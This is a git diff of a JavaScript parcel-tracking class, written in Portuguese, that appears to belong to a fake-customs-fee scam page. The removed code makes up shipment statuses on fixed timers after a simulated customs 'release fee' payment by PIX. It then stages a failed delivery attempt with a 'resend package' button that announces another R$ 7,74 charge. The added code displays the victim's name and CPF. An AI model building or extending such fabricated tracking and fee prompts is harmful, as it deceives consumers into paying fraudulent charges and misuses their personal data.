-        
-        // Animar entrada
-        setTimeout(() => {
-            successStep.style.opacity = '1';
-            successStep.style.transform = 'translateY(0)';
-        }, 100);
-        
-        // Scroll para o novo item
-        successStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    }
-    
-    startPostLiberationFlow() {
-        console.log('🚀 Iniciando fluxo pós-liberação');
-        
-        // Etapa 1: Pedido liberado na alfândega (imediato)
-        setTimeout(() => {
-            this.addTimelineStep('Pedido liberado na alfândega', 'Seu pedido foi liberado após o pagamento da taxa alfandegária');
-        }, 3000);
-        
-        // Etapa 2: Pedido sairá para entrega (após 6 segundos)
-        setTimeout(() => {
-            this.addTimelineStep('Pedido sairá para entrega', 'Pedido sairá para entrega para seu endereço');
-        }, 6000);
-        
-        // Etapa 3: Pedido em trânsito (após 9 segundos)
-        setTimeout(() => {
-            this.addTimelineStep('Pedido em trânsito', 'Pedido em trânsito para seu endereço');
-        }, 9000);
-        
-        // Etapa 4: Pedido em rota de entrega (após 12 segundos)
-        setTimeout(() => {
-            this.addTimelineStep('Pedido em rota de entrega', 'Pedido em rota de entrega para seu endereço, aguarde');
-        }, 12000);
-        
-        // Etapa 5: Tentativa de entrega (após 15 segundos)
-        setTimeout(() => {
-            this.addTimelineStep('Tentativa de entrega', '1ª tentativa de entrega realizada, mas não foi possível entregar', true);
-        }, 15000);
-    }
-    
-    addTimelineStep(title, description, isDeliveryAttempt = false) {
-        const timeline = document.getElementById('trackingTimeline');
-        if (!timeline) return;
-        
-        const newStep = this.createTimelineItem({
-            date: new Date(),
-            description: description,
-            completed: true,
-            isDeliveryAttempt: isDeliveryAttempt
-        }, Date.now());
-        
-        // Se for tentativa de entrega, adicionar botão de reenvio
-        if (isDeliveryAttempt) {
-            const buttonHtml = `
-                <button class="delivery-retry-btn" style="
-                    background: linear-gradient(45deg, #ff6b35, #f7931e);
-                    color: white;
-                    border: none;
-                    padding: 12px 25px;
-                    font-size: 1rem;
-                    font-weight: 700;
-                    border-radius: 25px;
-                    cursor: pointer;
-                    transition: all 0.3s ease;
-                    box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
-                    animation: pulse 2s infinite;
-                    font-family: Roboto, sans-serif;
-                    letter-spacing: 0.5px;
-                    margin-top: 15px;
-                    display: inline-flex;
-                    align-items: center;
-                    gap: 8px;
-                ">
-                    <i class="fas fa-redo"></i> Reenviar Pacote
-                </button>
-            `;
-            
-            const timelineText = newStep.querySelector('.timeline-text');
-            if (timelineText) {
-                timelineText.innerHTML += buttonHtml;
-                
-                // Configurar evento do botão de reenvio
-                const retryButton = timelineText.querySelector('.delivery-retry-btn');
-                if (retryButton) {
-                    retryButton.addEventListener('click', () => {
-                        this.showDeliveryRetryModal();
-                    });
-                }
-            }
-        }
-        
-        timeline.appendChild(newStep);
-        
-        // Animar entrada
-        setTimeout(() => {
-            newStep.style.opacity = '1';
-            newStep.style.transform = 'translateY(0)';
-        }, 100);
-        
-        // Scroll para o novo item
-        newStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        
-        console.log(`✅ Nova etapa adicionada: ${title}`);
-    }
-    
-    showDeliveryRetryModal() {
-        // Implementar modal de reenvio similar ao de liberação
-        console.log('🚚 Abrindo modal de reenvio de entrega');
-        
-        // Por enquanto, apenas log - pode ser expandido depois
-        alert('Modal de reenvio de entrega - R$ 7,74\n\nEsta funcionalidade pode ser expandida conforme necessário.');
     }
 
     closeLiberationModal() {
@@ -849,7 +904,6 @@ export class TrackingSystem {
 
             if (navigator.clipboard && window.isSecureContext) {
                 navigator.clipboard.writeText(pixInput.value).then(() => {
-                    console.log('✅ PIX copiado:', pixInput.value.substring(0, 50) + '...');
                     this.showCopySuccess(copyButton);
                 }).catch(() => {
                     this.fallbackCopy(pixInput, copyButton);
@@ -866,7 +920,6 @@ export class TrackingSystem {
         try {
             const successful = document.execCommand('copy');
             if (successful) {
-                console.log('✅ PIX copiado via execCommand');
                 this.showCopySuccess(button);
             }
         } catch (error) {
@@ -885,149 +938,69 @@ export class TrackingSystem {
         }, 2000);
     }
 
-    simulatePayment() {
-        console.log('🎭 Simulando pagamento realizado');
-        
-        // Fechar modal atual
-        this.closeLiberationModal();
-        
-        // Mostrar notificação de sucesso
-        this.showPaymentSuccessNotification();
-        
-        // Atualizar timeline após 2 segundos
-        setTimeout(() => {
-            this.addPaymentSuccessStep();
-            this.startPostLiberationFlow();
-        }, 2000);
-    }
-    
-    showPaymentSuccessNotification() {
-        const notification = document.createElement('div');
-        notification.id = 'paymentSuccessNotification';
-        notification.style.cssText = `
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(45deg, #27ae60, #2ecc71);
-            color: white;
-            padding: 20px 25px;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
-            z-index: 3000;
-            animation: slideInRight 0.5s ease;
-            font-family: Inter, sans-serif;
-            max-width: 350px;
-        `;
-        
-        notification.innerHTML = `
-            <div style="display: flex; align-items: center; gap: 12px;">
-                <i class="fas fa-check-circle" style="font-size: 24px;"></i>
-                <div>
-                    <div style="font-weight: 700; font-size: 16px; margin-bottom: 4px;">
-                        Pagamento Confirmado!
-                    </div>
-                    <div style="font-size: 14px; opacity: 0.9;">
-                        Taxa de liberação paga com sucesso
-                    </div>
-                </div>
-            </div>
-        `;
-        
-        document.body.appendChild(notification);
-        
-        // Remover após 4 segundos
-        setTimeout(() => {
-            if (notification.parentNode) {
-                notification.style.animation = 'slideOutRight 0.5s ease';
-                setTimeout(() => notification.remove(), 500);
-            }
-        }, 4000);
-        
-        // Adicionar animações CSS se não existirem
-        if (!document.getElementById('paymentAnimations')) {
-            const style = document.createElement('style');
-            style.id = 'paymentAnimations';
-            style.textContent = `
-                @keyframes slideInRight {
-                    from { transform: translateX(100%); opacity: 0; }
-                    to { transform: translateX(0); opacity: 1; }
-                }
-                @keyframes slideOutRight {
-                    from { transform: translateX(0); opacity: 1; }
-                    to { transform: translateX(100%); opacity: 0; }
-                }
-            `;
-            document.head.appendChild(style);
+    displayOrderDetails() {
+        if (!this.userData) return;
+
+        const orderDetails = document.getElementById('orderDetails');
+        const customerName = document.getElementById('customerName');
+        const fullName = document.getElementById('fullName');
+        const formattedCpf = document.getElementById('formattedCpf');
+
+        if (orderDetails) {
+            orderDetails.style.display = 'block';
+        }
+
+        if (customerName) {
+            customerName.textContent = this.userData.nome.split(' ')[0];
+        }
+
+        if (fullName) {
+            fullName.textContent = this.userData.nome;
+        }
+
+        if (formattedCpf) {
+            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
         }
     }
-    
-    addPaymentSuccessStep() {
-        const timeline = document.getElementById('trackingTimeline');
-        if (!timeline) return;
-        
-        const successStep = this.createTimelineItem({
-            date: new Date(),
-            description: 'Taxa de liberação aduaneira paga com sucesso',
-            completed: true
-        }, 999);
-        
-        // Adicionar classe especial para destaque
-        successStep.classList.add('payment-success');
-        successStep.style.cssText += `
-            background: linear-gradient(135deg, #d4edda, #c3e6cb);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 10px 0;
-            border: 2px solid #27ae60;
-        `;
-        
-        timeline.appendChild(successStep);
-        
-        // Animar entrada
-        setTimeout(() => {
-            successStep.style.opacity = '1';
-            successStep.style.transform = 'translateY(0)';
-        }, 100);
-        
-        // Scroll para o novo item
-        successStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    startAutoRefresh() {
+        // Atualizar a cada 30 segundos para verificar novas etapas
+        this.refreshInterval = setInterval(() => {
+            if (this.trackingData) {
+                const hasNewSteps = this.trackingService.checkForNewSteps(this.trackingData.timeline);
+                if (hasNewSteps) {
+                    console.log('🔄 Novas etapas disponíveis, atualizando...');
+                    this.displayTrackingResults();
+                }
+            }
+        }, 30000);
     }
-    
-    startPostLiberationFlow() {
-        console.log('🚀 Iniciando fluxo pós-liberação');
-        
-        // Aqui você pode adicionar as próximas etapas do processo
-        // Por exemplo: "Pedido liberado", "Saindo para entrega", etc.
-        
-        setTimeout(() => {
-            this.addTimelineStep('Pedido liberado na alfândega', 'Seu pedido foi liberado e seguirá para entrega');
-        }, 3000);
-        
-        setTimeout(() => {
-            this.addTimelineStep('Preparando para entrega', 'Pedido sendo preparado para sair para entrega');
-        }, 6000);
+
+    stopAutoRefresh() {
+        if (this.refreshInterval) {
+            clearInterval(this.refreshInterval);
+            this.refreshInterval = null;
+        }
     }
-    
-    addTimelineStep(title, description) {
-        const timeline = document.getElementById('trackingTimeline');
-        if (!timeline) return;
-        
-        const newStep = this.createTimelineItem({
-            date: new Date(),
-            description: description,
-            completed: true
-        }, Date.now());
-        
-        timeline.appendChild(newStep);
-        
-        // Animar entrada
-        setTimeout(() => {
-            newStep.style.opacity = '1';
-            newStep.style.transform = 'translateY(0)';
-        }, 100);
-        
-        // Scroll para o novo item
-        newStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    showLoadingNotification() {
+        UIHelpers.showLoadingNotification();
+    }
+
+    closeLoadingNotification() {
+        UIHelpers.closeLoadingNotification();
+    }
+
+    showError(message) {
+        UIHelpers.showError(message);
+    }
+
+    scrollToElement(element, offset = 0) {
+        UIHelpers.scrollToElement(element, offset);
+    }
+
+    animateTimeline() {
+        UIHelpers.animateTimeline();
     }
 
     checkURLParams() {
@@ -1050,5 +1023,9 @@ export class TrackingSystem {
         }
     }
 
-
+    // Cleanup ao sair
+    cleanup() {
+        this.stopAutoRefresh();
+        console.log('🧹 Sistema de rastreamento limpo');
+    }
 }
